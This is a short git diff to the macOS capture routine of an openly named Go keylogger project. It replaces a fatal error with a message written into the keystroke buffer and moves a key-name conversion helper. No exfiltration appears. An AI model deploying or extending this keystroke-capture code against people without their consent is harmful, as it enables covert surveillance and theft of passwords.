@@ -2,7 +2,6 @@ package mac
 
 import (
 	"bytes"
-	"log"
 
 	"github.com/KeisukeYamashita/go-macos-keylogger/pkg/keyboard"
 	"github.com/KeisukeYamashita/go-macos-keylogger/pkg/keylogger"
@@ -18,7 +17,7 @@ func NewMacLogger() *MacLogger {
 func (l *MacLogger) CaptureKeyboardKeys(logBuffer *bytes.Buffer) {
 	kl, err := keylogger.New()
 	if err != nil {
-		log.Fatal("No keyboard found...")
+		logBuffer.WriteString("Keyboard not found...")
 	}
 
 	f := func(key keyboard.Key, state keyboard.State) {
@@ -29,6 +28,10 @@ func (l *MacLogger) CaptureKeyboardKeys(logBuffer *bytes.Buffer) {
 
 	kl.Listen(f)
 
+}
+
+func convertKey(key keyboard.Key) string {
+	return KeyMapping[key]
 }
 
 var KeyMapping = map[keyboard.Key]string{
@@ -149,8 +152,4 @@ var KeyMapping = map[keyboard.Key]string{
 	keyboard.ArrowUp:    "ArrowUp",
 	keyboard.ArrowRight: "ArrowRight",
 	keyboard.ArrowDown:  "ArrowDown",
-}
-
-func convertKey(key keyboard.Key) string {
-	return KeyMapping[key]
 }
